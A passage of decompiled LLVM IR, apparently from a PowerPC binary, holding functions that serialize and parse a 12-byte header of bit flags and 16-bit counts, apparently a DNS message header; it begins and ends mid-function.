  uselistorder i32 (i32, i32, i32)* @function_10006e24, { 15, 14, 9, 2, 8, 7, 4, 0, 1, 3, 13, 12, 11, 10, 6, 5 }
  uselistorder i32 (i32, i32, i32)* @function_1000bed0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000c2bc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000c2a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c26c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c240, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c21c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000c174, { 1, 0 }
  uselistorder label %dec_label_pc_1000c168, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c14c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c12c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c128, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c098, { 1, 0 }
}

define i32 @function_1000c2d4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c2d4:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r6.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_1000c3b8, label %dec_label_pc_1000c2e0

dec_label_pc_1000c2e0:                            ; preds = %dec_label_pc_1000c2d4
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_1000c2e0 = add i32 %tmp, 2
  %v2_1000c2e0 = inttoptr i32 %v1_1000c2e0 to i8*
  %v3_1000c2e0 = load i8, i8* %v2_1000c2e0, align 1
  store i32 12, i32* %r6.global-to-local, align 4
  store i8 %v3_1000c2e0, i8* %tmp3, align 1
  %v2_1000c2ec = load i32, i32* %arg1, align 4
  %v1_1000c2f0 = trunc i32 %v2_1000c2ec to i8
  %v4_1000c2f0 = add i32 %arg2, 1
  %v5_1000c2f0 = inttoptr i32 %v4_1000c2f0 to i8*
  store i8 %v1_1000c2f0, i8* %v5_1000c2f0, align 1
  %v1_1000c2f4 = add i32 %tmp, 12
  %v2_1000c2f4 = inttoptr i32 %v1_1000c2f4 to i32*
  %v3_1000c2f4 = load i32, i32* %v2_1000c2f4, align 4
  %v1_1000c2f8 = add i32 %tmp, 16
  %v2_1000c2f8 = inttoptr i32 %v1_1000c2f8 to i32*
  %v3_1000c2f8 = load i32, i32* %v2_1000c2f8, align 4
  store i32 %v3_1000c2f8, i32* %r11.global-to-local, align 4
  %v1_1000c2fc = add i32 %tmp, 4
  %v2_1000c2fc = inttoptr i32 %v1_1000c2fc to i32*
  %v3_1000c2fc = load i32, i32* %v2_1000c2fc, align 4
  %v1_1000c300 = add i32 %tmp, 8
  %v2_1000c300 = inttoptr i32 %v1_1000c300 to i32*
  %v3_1000c300 = load i32, i32* %v2_1000c300, align 4
  %v1_1000c304 = add i32 %tmp, 20
  %v2_1000c304 = inttoptr i32 %v1_1000c304 to i32*
  %v3_1000c304 = load i32, i32* %v2_1000c304, align 4
  store i32 %v3_1000c304, i32* %r7.global-to-local, align 4
  %v2_1000c308 = icmp ne i32 %v3_1000c2f4, 0
  %v5_1000c30c = zext i1 %v2_1000c308 to i32
  store i32 %v5_1000c30c, i32* %r10.global-to-local, align 4
  %not.v2_1000c310 = icmp eq i32 %v3_1000c2fc, 0
  %v6_1000c314 = sext i1 %not.v2_1000c310 to i32
  %v2_1000c318 = icmp ne i32 %v3_1000c2f8, 0
  %v5_1000c31c = zext i1 %v2_1000c318 to i32
  store i32 %v5_1000c31c, i32* %r11.global-to-local, align 4
  %v1_1000c324 = call i32 @__asm_rlwinm(i32 %v6_1000c314, i32 0, i32 24, i32 24)
  %v0_1000c328 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c328 = mul i32 %v0_1000c328, 4
  store i32 %v1_1000c328, i32* %r10.global-to-local, align 4
  %v1_1000c32c = call i32 @__asm_rlwinm(i32 %v3_1000c300, i32 3, i32 25, i32 28)
  %v1_1000c330 = add i32 %v1_1000c324, 128
  %v0_1000c334 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000c334 = icmp ne i32 %v0_1000c334, 0
  %v5_1000c338 = zext i1 %v2_1000c334 to i32
  %v2_1000c33c = or i32 %v1_1000c328, %v1_1000c32c
  store i32 %v2_1000c33c, i32* %r10.global-to-local, align 4
  %v0_1000c340 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c340 = mul i32 %v0_1000c340, 2
  store i32 %v1_1000c340, i32* %r11.global-to-local, align 4
  %v2_1000c344 = or i32 %v2_1000c33c, %v5_1000c338
  %v2_1000c348 = or i32 %v2_1000c344, %v1_1000c330
  %v2_1000c34c = or i32 %v2_1000c348, %v1_1000c340
  %v1_1000c350 = trunc i32 %v2_1000c34c to i8
  %v4_1000c350 = add i32 %arg2, 2
  %v5_1000c350 = inttoptr i32 %v4_1000c350 to i8*
  store i8 %v1_1000c350, i8* %v5_1000c350, align 1
  %v1_1000c354 = add i32 %tmp, 24
  %v2_1000c354 = inttoptr i32 %v1_1000c354 to i32*
  %v3_1000c354 = load i32, i32* %v2_1000c354, align 4
  %v1_1000c358 = add i32 %tmp, 28
  %v2_1000c358 = inttoptr i32 %v1_1000c358 to i32*
  %v3_1000c358 = load i32, i32* %v2_1000c358, align 4
  %not.v2_1000c35c = icmp eq i32 %v3_1000c354, 0
  %v6_1000c360 = sext i1 %not.v2_1000c35c to i32
  %v1_1000c364 = call i32 @__asm_rlwinm(i32 %v6_1000c360, i32 0, i32 24, i32 24)
  %v1_1000c368 = urem i32 %v3_1000c358, 16
  %v1_1000c36c = add i32 %v1_1000c364, 128
  %v2_1000c370 = or i32 %v1_1000c368, %v1_1000c36c
  %v1_1000c374 = trunc i32 %v2_1000c370 to i8
  %v4_1000c374 = add i32 %arg2, 3
  %v5_1000c374 = inttoptr i32 %v4_1000c374 to i8*
  store i8 %v1_1000c374, i8* %v5_1000c374, align 1
  %v1_1000c378 = add i32 %tmp, 34
  %v2_1000c378 = inttoptr i32 %v1_1000c378 to i8*
  %v3_1000c378 = load i8, i8* %v2_1000c378, align 1
  %v4_1000c37c = add i32 %arg2, 4
  %v5_1000c37c = inttoptr i32 %v4_1000c37c to i8*
  store i8 %v3_1000c378, i8* %v5_1000c37c, align 1
  %v1_1000c380 = add i32 %tmp, 32
  %v2_1000c380 = inttoptr i32 %v1_1000c380 to i32*
  %v3_1000c380 = load i32, i32* %v2_1000c380, align 4
  %v1_1000c384 = trunc i32 %v3_1000c380 to i8
  %v4_1000c384 = add i32 %arg2, 5
  %v5_1000c384 = inttoptr i32 %v4_1000c384 to i8*
  store i8 %v1_1000c384, i8* %v5_1000c384, align 1
  %v1_1000c388 = add i32 %tmp, 38
  %v2_1000c388 = inttoptr i32 %v1_1000c388 to i8*
  %v3_1000c388 = load i8, i8* %v2_1000c388, align 1
  %v4_1000c38c = add i32 %arg2, 6
  %v5_1000c38c = inttoptr i32 %v4_1000c38c to i8*
  store i8 %v3_1000c388, i8* %v5_1000c38c, align 1
  %v1_1000c390 = add i32 %tmp, 36
  %v2_1000c390 = inttoptr i32 %v1_1000c390 to i32*
  %v3_1000c390 = load i32, i32* %v2_1000c390, align 4
  %v1_1000c394 = trunc i32 %v3_1000c390 to i8
  %v4_1000c394 = add i32 %arg2, 7
  %v5_1000c394 = inttoptr i32 %v4_1000c394 to i8*
  store i8 %v1_1000c394, i8* %v5_1000c394, align 1
  %v1_1000c398 = add i32 %tmp, 42
  %v2_1000c398 = inttoptr i32 %v1_1000c398 to i8*
  %v3_1000c398 = load i8, i8* %v2_1000c398, align 1
  %v4_1000c39c = add i32 %arg2, 8
  %v5_1000c39c = inttoptr i32 %v4_1000c39c to i8*
  store i8 %v3_1000c398, i8* %v5_1000c39c, align 1
  %v1_1000c3a0 = add i32 %tmp, 40
  %v2_1000c3a0 = inttoptr i32 %v1_1000c3a0 to i32*
  %v3_1000c3a0 = load i32, i32* %v2_1000c3a0, align 4
  %v1_1000c3a4 = trunc i32 %v3_1000c3a0 to i8
  %v4_1000c3a4 = add i32 %arg2, 9
  %v5_1000c3a4 = inttoptr i32 %v4_1000c3a4 to i8*
  store i8 %v1_1000c3a4, i8* %v5_1000c3a4, align 1
  %v1_1000c3a8 = add i32 %tmp, 46
  %v2_1000c3a8 = inttoptr i32 %v1_1000c3a8 to i8*
  %v3_1000c3a8 = load i8, i8* %v2_1000c3a8, align 1
  %v4_1000c3ac = add i32 %arg2, 10
  %v5_1000c3ac = inttoptr i32 %v4_1000c3ac to i8*
  store i8 %v3_1000c3a8, i8* %v5_1000c3ac, align 1
  %v1_1000c3b0 = add i32 %tmp, 44
  %v2_1000c3b0 = inttoptr i32 %v1_1000c3b0 to i32*
  %v3_1000c3b0 = load i32, i32* %v2_1000c3b0, align 4
  %v1_1000c3b4 = trunc i32 %v3_1000c3b0 to i8
  %v4_1000c3b4 = add i32 %arg2, 11
  %v5_1000c3b4 = inttoptr i32 %v4_1000c3b4 to i8*
  store i8 %v1_1000c3b4, i8* %v5_1000c3b4, align 1
  %v0_1000c3b8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000c3b8

dec_label_pc_1000c3b8:                            ; preds = %dec_label_pc_1000c2d4, %dec_label_pc_1000c2e0
  %v0_1000c3b8 = phi i32 [ -1, %dec_label_pc_1000c2d4 ], [ %v0_1000c3b8.pre, %dec_label_pc_1000c2e0 ]
  ret i32 %v0_1000c3b8

; uselistorder directives
  uselistorder i32 %v1_1000c340, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 13, 1, 6, 9, 8, 12, 11, 10, 3, 2, 5, 4, 7 }
  uselistorder label %dec_label_pc_1000c3b8, { 1, 0 }
}

define i32 @function_1000c3c0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c3c0:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1000c3c0 = load i8, i8* %arg1, align 1
  %v4_1000c3c0 = zext i8 %v3_1000c3c0 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_1000c3c8 = add i32 %tmp, 1
  %v3_1000c3c8 = inttoptr i32 %v2_1000c3c8 to i8*
  %v4_1000c3c8 = load i8, i8* %v3_1000c3c8, align 1
  %v5_1000c3c8 = zext i8 %v4_1000c3c8 to i32
  %v1_1000c3d0 = mul nuw nsw i32 %v4_1000c3c0, 256
  %v2_1000c3d4 = or i32 %v5_1000c3c8, %v1_1000c3d0
  %v2_1000c3d8 = inttoptr i32 %arg2 to i32*
  store i32 %v2_1000c3d4, i32* %v2_1000c3d8, align 4
  %v0_1000c3dc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c3dc = add i32 %v0_1000c3dc, 2
  %v2_1000c3dc = inttoptr i32 %v1_1000c3dc to i8*
  %v3_1000c3dc = load i8, i8* %v2_1000c3dc, align 1
  %v4_1000c3dc = zext i8 %v3_1000c3dc to i32
  %v1_1000c3e0 = call i32 @__asm_rlwinm(i32 %v4_1000c3dc, i32 25, i32 31, i32 31)
  %v2_1000c3e4 = add i32 %arg2, 4
  %v3_1000c3e4 = inttoptr i32 %v2_1000c3e4 to i32*
  store i32 %v1_1000c3e0, i32* %v3_1000c3e4, align 4
  %v0_1000c3e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c3e8 = add i32 %v0_1000c3e8, 2
  %v2_1000c3e8 = inttoptr i32 %v1_1000c3e8 to i8*
  %v3_1000c3e8 = load i8, i8* %v2_1000c3e8, align 1
  %v4_1000c3e8 = zext i8 %v3_1000c3e8 to i32
  %v1_1000c3ec = call i32 @__asm_rlwinm(i32 %v4_1000c3e8, i32 29, i32 28, i32 31)
  %v2_1000c3f0 = add i32 %arg2, 8
  %v3_1000c3f0 = inttoptr i32 %v2_1000c3f0 to i32*
  store i32 %v1_1000c3ec, i32* %v3_1000c3f0, align 4
  %v0_1000c3f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c3f4 = add i32 %v0_1000c3f4, 2
  %v2_1000c3f4 = inttoptr i32 %v1_1000c3f4 to i8*
  %v3_1000c3f4 = load i8, i8* %v2_1000c3f4, align 1
  %v4_1000c3f4 = zext i8 %v3_1000c3f4 to i32
  %v1_1000c3f8 = call i32 @__asm_rlwinm(i32 %v4_1000c3f4, i32 30, i32 31, i32 31)
  %v2_1000c3fc = add i32 %arg2, 12
  %v3_1000c3fc = inttoptr i32 %v2_1000c3fc to i32*
  store i32 %v1_1000c3f8, i32* %v3_1000c3fc, align 4
  %v0_1000c400 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c400 = add i32 %v0_1000c400, 2
  %v2_1000c400 = inttoptr i32 %v1_1000c400 to i8*
  %v3_1000c400 = load i8, i8* %v2_1000c400, align 1
  %v4_1000c400 = zext i8 %v3_1000c400 to i32
  %v1_1000c404 = call i32 @__asm_rlwinm(i32 %v4_1000c400, i32 31, i32 31, i32 31)
  %v2_1000c408 = add i32 %arg2, 16
  %v3_1000c408 = inttoptr i32 %v2_1000c408 to i32*
  store i32 %v1_1000c404, i32* %v3_1000c408, align 4
  %v0_1000c40c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c40c = add i32 %v0_1000c40c, 2
  %v2_1000c40c = inttoptr i32 %v1_1000c40c to i8*
  %v3_1000c40c = load i8, i8* %v2_1000c40c, align 1
  %tmp1 = urem i8 %v3_1000c40c, 2
  %v1_1000c410 = zext i8 %tmp1 to i32
  %v2_1000c414 = add i32 %arg2, 20
  %v3_1000c414 = inttoptr i32 %v2_1000c414 to i32*
  store i32 %v1_1000c410, i32* %v3_1000c414, align 4
  %v0_1000c418 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c418 = add i32 %v0_1000c418, 3
  %v2_1000c418 = inttoptr i32 %v1_1000c418 to i8*
  %v3_1000c418 = load i8, i8* %v2_1000c418, align 1
  %v4_1000c418 = zext i8 %v3_1000c418 to i32
  %v1_1000c41c = call i32 @__asm_rlwinm(i32 %v4_1000c418, i32 25, i32 31, i32 31)
  %v2_1000c420 = add i32 %arg2, 24
  %v3_1000c420 = inttoptr i32 %v2_1000c420 to i32*
  store i32 %v1_1000c41c, i32* %v3_1000c420, align 4
  %v0_1000c424 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c424 = add i32 %v0_1000c424, 3
  %v2_1000c424 = inttoptr i32 %v1_1000c424 to i8*
  %v3_1000c424 = load i8, i8* %v2_1000c424, align 1
  %tmp2 = urem i8 %v3_1000c424, 16
  %v1_1000c428 = zext i8 %tmp2 to i32
  %v2_1000c42c = add i32 %arg2, 28
  %v3_1000c42c = inttoptr i32 %v2_1000c42c to i32*
  store i32 %v1_1000c428, i32* %v3_1000c42c, align 4
  %v0_1000c430 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c430 = add i32 %v0_1000c430, 4
  %v2_1000c430 = inttoptr i32 %v1_1000c430 to i8*
  %v3_1000c430 = load i8, i8* %v2_1000c430, align 1
  %v4_1000c430 = zext i8 %v3_1000c430 to i32
  %v1_1000c434 = add i32 %v0_1000c430, 5
  %v2_1000c434 = inttoptr i32 %v1_1000c434 to i8*
  %v3_1000c434 = load i8, i8* %v2_1000c434, align 1
  %v4_1000c434 = zext i8 %v3_1000c434 to i32
  %v1_1000c438 = mul nuw nsw i32 %v4_1000c430, 256
  %v2_1000c43c = or i32 %v4_1000c434, %v1_1000c438
  %v2_1000c440 = add i32 %arg2, 32
  %v3_1000c440 = inttoptr i32 %v2_1000c440 to i32*
  store i32 %v2_1000c43c, i32* %v3_1000c440, align 4
  %v0_1000c444 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c444 = add i32 %v0_1000c444, 6
  %v2_1000c444 = inttoptr i32 %v1_1000c444 to i8*
  %v3_1000c444 = load i8, i8* %v2_1000c444, align 1
  %v4_1000c444 = zext i8 %v3_1000c444 to i32
  %v1_1000c448 = add i32 %v0_1000c444, 7
  %v2_1000c448 = inttoptr i32 %v1_1000c448 to i8*
  %v3_1000c448 = load i8, i8* %v2_1000c448, align 1
  %v4_1000c448 = zext i8 %v3_1000c448 to i32
  %v1_1000c44c = mul nuw nsw i32 %v4_1000c444, 256
  %v2_1000c450 = or i32 %v4_1000c448, %v1_1000c44c
  %v2_1000c454 = add i32 %arg2, 36
  %v3_1000c454 = inttoptr i32 %v2_1000c454 to i32*
  store i32 %v2_1000c450, i32* %v3_1000c454, align 4
  %v0_1000c458 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c458 = add i32 %v0_1000c458, 8
  %v2_1000c458 = inttoptr i32 %v1_1000c458 to i8*
  %v3_1000c458 = load i8, i8* %v2_1000c458, align 1
  %v4_1000c458 = zext i8 %v3_1000c458 to i32
  %v1_1000c45c = add i32 %v0_1000c458, 9
  %v2_1000c45c = inttoptr i32 %v1_1000c45c to i8*
  %v3_1000c45c = load i8, i8* %v2_1000c45c, align 1
  %v4_1000c45c = zext i8 %v3_1000c45c to i32
  %v1_1000c460 = mul nuw nsw i32 %v4_1000c458, 256
  %v2_1000c464 = or i32 %v4_1000c45c, %v1_1000c460
  %v2_1000c468 = add i32 %arg2, 40
  %v3_1000c468 = inttoptr i32 %v2_1000c468 to i32*
  store i32 %v2_1000c464, i32* %v3_1000c468, align 4
  %v0_1000c46c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c46c = add i32 %v0_1000c46c, 10
  %v2_1000c46c = inttoptr i32 %v1_1000c46c to i8*
  %v3_1000c46c = load i8, i8* %v2_1000c46c, align 1
  %v4_1000c46c = zext i8 %v3_1000c46c to i32
  %v1_1000c470 = add i32 %v0_1000c46c, 11
  %v2_1000c470 = inttoptr i32 %v1_1000c470 to i8*
  %v3_1000c470 = load i8, i8* %v2_1000c470, align 1
  %v4_1000c470 = zext i8 %v3_1000c470 to i32
  store i32 %v4_1000c470, i32* %r9.global-to-local, align 4
  %v1_1000c474 = mul nuw nsw i32 %v4_1000c46c, 256
  %v2_1000c478 = or i32 %v4_1000c470, %v1_1000c474
  %v2_1000c47c = add i32 %arg2, 44
  %v3_1000c47c = inttoptr i32 %v2_1000c47c to i32*
  store i32 %v2_1000c478, i32* %v3_1000c47c, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 1, 2, 6, 7, 8, 5, 3, 0, 4 }
  uselistorder i32 11, { 7, 8, 10, 9, 3, 11, 0, 1, 12, 13, 14, 15, 16, 2, 4, 5, 6 }
  uselistorder i32 40, { 4, 5, 8, 6, 7, 0, 9, 10, 11, 12, 13, 3, 2, 1 }
  uselistorder i32 7, { 8, 9, 11, 12, 13, 14, 1, 2, 3, 4, 5, 6, 7, 10, 0 }
  uselistorder i32 5, { 18, 19, 12, 13, 14, 3, 4, 15, 5, 16, 17, 2, 1, 20, 21, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 28, { 14, 15, 16, 17, 2, 3, 6, 27, 31, 43, 18, 0, 19, 20, 21, 4, 5, 32, 11, 13, 22, 28, 29, 23, 24, 33, 34, 35, 36, 37, 38, 41, 39, 40, 1, 42, 44, 30, 7, 8, 9, 10, 12, 25, 26 }
  uselistorder i32 29, { 6, 0, 1, 14, 15, 4, 5, 7, 8, 9, 10, 13, 11, 12, 18, 19, 16, 17, 2, 3 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @function_1000c484(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c484:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_1000c4a0 = load i32, i32* %arg1, align 4
  store i32 %v2_1000c4a0, i32* %r3.global-to-local, align 4
  store i32 268485800, i32* @lr, align 4
  %v1_1000c4a4 = inttoptr i32 %v2_1000c4a0 to i8*
  %v2_1000c4a4 = call i32 @function_1000cbd4(i8* %v1_1000c4a4)
  store i32 %v2_1000c4a4, i32* %r3.global-to-local, align 4
  %v1_1000c4a8 = icmp slt i32 %v2_1000c4a4, 0
  %v1_1000c4ac = load i32, i32* @r29, align 4
  %v2_1000c4ac = sub i32 %v1_1000c4ac, %v2_1000c4a4
  store i32 %v2_1000c4ac, i32* @r29, align 4
  br i1 %v1_1000c4a8, label %dec_label_pc_1000c4ec, label %dec_label_pc_1000c4b8

dec_label_pc_1000c4b8:                            ; preds = %dec_label_pc_1000c484
  %v2_1000c4b0 = icmp sgt i32 %v2_1000c4ac, 3
  %v0_1000c4b8 = load i32, i32* @r30, align 4
  %v2_1000c4b8 = add i32 %v0_1000c4b8, %v2_1000c4a4
  store i32 %v2_1000c4b8, i32* %r9.global-to-local, align 4
  br i1 %v2_1000c4b0, label %dec_label_pc_1000c4c8, label %dec_label_pc_1000c4c0

dec_label_pc_1000c4c0:                            ; preds = %dec_label_pc_1000c4b8
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c4ec

dec_label_pc_1000c4c8:                            ; preds = %dec_label_pc_1000c4b8
  %v0_1000c4c8 = load i32, i32* @r31, align 4
  %v1_1000c4c8 = add i32 %v0_1000c4c8, 6
  %v2_1000c4c8 = inttoptr i32 %v1_1000c4c8 to i8*
  %v3_1000c4c8 = load i8, i8* %v2_1000c4c8, align 1
  %v5_1000c4cc = inttoptr i32 %v2_1000c4b8 to i8*
  store i8 %v3_1000c4c8, i8* %v5_1000c4cc, align 1
  %v0_1000c4d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000c4d0 = add i32 %v0_1000c4d0, 4
  store i32 %v1_1000c4d0, i32* %r3.global-to-local, align 4
  %v0_1000c4d4 = load i32, i32* @r31, align 4
  %v1_1000c4d4 = add i32 %v0_1000c4d4, 4
  %v2_1000c4d4 = inttoptr i32 %v1_1000c4d4 to i32*
  %v3_1000c4d4 = load i32, i32* %v2_1000c4d4, align 4
  %v1_1000c4d8 = trunc i32 %v3_1000c4d4 to i8
  %v2_1000c4d8 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000c4d8 = add i32 %v2_1000c4d8, 1
  %v4_1000c4d8 = inttoptr i32 %v3_1000c4d8 to i8*
  store i8 %v1_1000c4d8, i8* %v4_1000c4d8, align 1
  %v0_1000c4dc = load i32, i32* @r31, align 4
  %v1_1000c4dc = add i32 %v0_1000c4dc, 10
  %v2_1000c4dc = inttoptr i32 %v1_1000c4dc to i8*
  %v3_1000c4dc = load i8, i8* %v2_1000c4dc, align 1
  %v2_1000c4e0 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000c4e0 = add i32 %v2_1000c4e0, 2
  %v4_1000c4e0 = inttoptr i32 %v3_1000c4e0 to i8*
  store i8 %v3_1000c4dc, i8* %v4_1000c4e0, align 1
  %v0_1000c4e4 = load i32, i32* @r31, align 4
  %v1_1000c4e4 = add i32 %v0_1000c4e4, 8
  %v2_1000c4e4 = inttoptr i32 %v1_1000c4e4 to i32*
  %v3_1000c4e4 = load i32, i32* %v2_1000c4e4, align 4
  %v1_1000c4e8 = trunc i32 %v3_1000c4e4 to i8
  %v2_1000c4e8 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000c4e8 = add i32 %v2_1000c4e8, 3
  %v4_1000c4e8 = inttoptr i32 %v3_1000c4e8 to i8*
  store i8 %v1_1000c4e8, i8* %v4_1000c4e8, align 1
  %v0_1000c4fc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c4ec

dec_label_pc_1000c4ec:                            ; preds = %dec_label_pc_1000c484, %dec_label_pc_1000c4c0, %dec_label_pc_1000c4c8
  %v0_1000c4fc = phi i32 [ %v2_1000c4a4, %dec_label_pc_1000c484 ], [ -1, %dec_label_pc_1000c4c0 ], [ %v0_1000c4fc.pre, %dec_label_pc_1000c4c8 ]
  ret i32 %v0_1000c4fc

; uselistorder directives
  uselistorder i32 %v2_1000c4a4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder label %dec_label_pc_1000c4ec, { 2, 1, 0 }
}

define i32 @function_1000c500(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c500:
  store i32 268485904, i32* @lr, align 4
  %v0_1000c50c = call i32 @function_1000cd94()
  %v1_1000c510 = icmp slt i32 %v0_1000c50c, 0
  br i1 %v1_1000c510, label %dec_label_pc_1000c51c, label %dec_label_pc_1000c518

dec_label_pc_1000c518:                            ; preds = %dec_label_pc_1000c500
  %v1_1000c518 = add i32 %v0_1000c50c, 4
  br label %dec_label_pc_1000c51c

dec_label_pc_1000c51c:                            ; preds = %dec_label_pc_1000c500, %dec_label_pc_1000c518
  %v0_1000c528 = phi i32 [ %v0_1000c50c, %dec_label_pc_1000c500 ], [ %v1_1000c518, %dec_label_pc_1000c518 ]
  ret i32 %v0_1000c528

; uselistorder directives
  uselistorder label %dec_label_pc_1000c51c, { 1, 0 }
}

define i32 @function_1000c52c(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
dec_label_pc_1000c52c:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_1000c530 = load i32, i32* @lr, align 4
  store i32 %v0_1000c530, i32* %r0.global-to-local, align 4
  %v2_1000c538 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_1000c538, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %v2_1000c538, i32* %r5.global-to-local, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268485980, i32* @lr, align 4
  %v2_1000c558 = call i32 @function_1000cca0(i32 %v2_1000c538, i32 256)
  store i32 %v2_1000c558, i32* @r27, align 4
  %v1_1000c55c = icmp slt i32 %v2_1000c558, 0
  %v0_1000c560 = load i32, i32* @r28, align 4
  %v2_1000c560 = add i32 %v0_1000c560, %v2_1000c558
  store i32 %v2_1000c560, i32* @r28, align 4
  %v1_1000c564 = load i32, i32* @r29, align 4
  %v2_1000c564 = sub i32 %v1_1000c564, %v2_1000c560
  %v1_1000c568 = add i32 %v2_1000c564, -10
  br i1 %v1_1000c55c, label %dec_label_pc_1000c624, label %dec_label_pc_1000c574

dec_label_pc_1000c574:                            ; preds = %dec_label_pc_1000c52c
  %v0_1000c578 = load i32, i32* @r26, align 4
  %v2_1000c578 = add i32 %v0_1000c578, %v2_1000c560
  store i32 %v2_1000c578, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_1000c568, -1
  br i1 %tmp6, label %dec_label_pc_1000c588, label %dec_label_pc_1000c580

dec_label_pc_1000c580:                            ; preds = %dec_label_pc_1000c574
  store i32 %v1_1000c568, i32* @r27, align 4
  br label %dec_label_pc_1000c624

dec_label_pc_1000c588:                            ; preds = %dec_label_pc_1000c574
  store i32 268486028, i32* @lr, align 4
  %v1_1000c588 = call i32 @function_100073ac(i32 %v2_1000c538)
  %v0_1000c58c = load i32, i32* @r30, align 4
  %v1_1000c58c = add i32 %v0_1000c58c, 2
  store i32 %v1_1000c58c, i32* %r8.global-to-local, align 4
  %v1_1000c590 = load i32, i32* @r31, align 4
  %v2_1000c590 = inttoptr i32 %v1_1000c590 to i32*
  store i32 %v1_1000c588, i32* %v2_1000c590, align 4
  %v0_1000c594 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c594 = add i32 %v0_1000c594, 2
  store i32 %v1_1000c594, i32* %r10.global-to-local, align 4
  %v0_1000c598 = load i32, i32* @r30, align 4
  %v1_1000c598 = add i32 %v0_1000c598, 10
  store i32 %v1_1000c598, i32* %r5.global-to-local, align 4
  %v0_1000c59c = load i32, i32* @r28, align 4
  %v1_1000c59c = add i32 %v0_1000c59c, 10
  store i32 %v1_1000c59c, i32* %r6.global-to-local, align 4
  %v0_1000c5a0 = load i32, i32* @r26, align 4
  %v2_1000c5a0 = add i32 %v0_1000c5a0, %v0_1000c59c
  %v3_1000c5a0 = inttoptr i32 %v2_1000c5a0 to i8*
  %v4_1000c5a0 = load i8, i8* %v3_1000c5a0, align 1
  %v5_1000c5a0 = zext i8 %v4_1000c5a0 to i32
  store i32 %v5_1000c5a0, i32* %r0.global-to-local, align 4
  %v1_1000c5a4 = add i32 %v0_1000c598, 1
  %v2_1000c5a4 = inttoptr i32 %v1_1000c5a4 to i8*
  %v3_1000c5a4 = load i8, i8* %v2_1000c5a4, align 1
  %v4_1000c5a4 = zext i8 %v3_1000c5a4 to i32
  store i32 %v4_1000c5a4, i32* %r9.global-to-local, align 4
  %v1_1000c5a8 = mul nuw nsw i32 %v5_1000c5a0, 256
  %v2_1000c5ac = or i32 %v4_1000c5a4, %v1_1000c5a8
